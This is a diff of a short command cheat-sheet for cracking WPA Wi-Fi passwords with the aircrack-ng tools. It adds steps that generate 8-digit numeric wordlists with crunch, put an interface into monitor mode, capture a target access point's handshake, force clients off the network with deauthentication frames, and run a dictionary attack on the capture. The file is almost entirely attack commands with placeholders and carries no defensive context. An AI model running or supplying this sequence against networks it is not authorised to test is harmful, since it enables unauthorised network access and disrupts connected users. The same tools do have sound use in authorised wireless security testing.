@@ -1,33 +1,30 @@
-check for errors
+mkdir ~/hs
+cd ~/hs
 
+# create simple password list with only numbers
+crunch 8 8 0123456789 -o ~/pass.txt
+
+# or create revert list
+crunch 8 8 0987654321 -o ~/pass_rev.txt
+
+
+# kill services (iw, wpa_supplicant)
 airmon-ng check kill
 
 
-
-
-start monitor mode
-
+# start monitor mode
 airmon-ng start <interface>
 
 
-dump
-
+# dump
 airodump-ng <interface>mon
 
 
-target dump
+# target dump
+airodump-ng -c <channel> --bssid <ap> -w <dump name> <interface>mon
 
-airodump-ng -c <chanell> --bssid <ap> -w <dump name> <interface>mon
-
-
-
-crack
-
-aircrack-ng -b <ap> <dump>.cap -w <wordlist>
-
-
-
-
-active attack
-
+# active attack
 aireplay-ng -0 3 -a <ap> -c <user> <interface>
+
+# crack
+aircrack-ng -b <ap> <dump>.cap -w ~/pass.txt
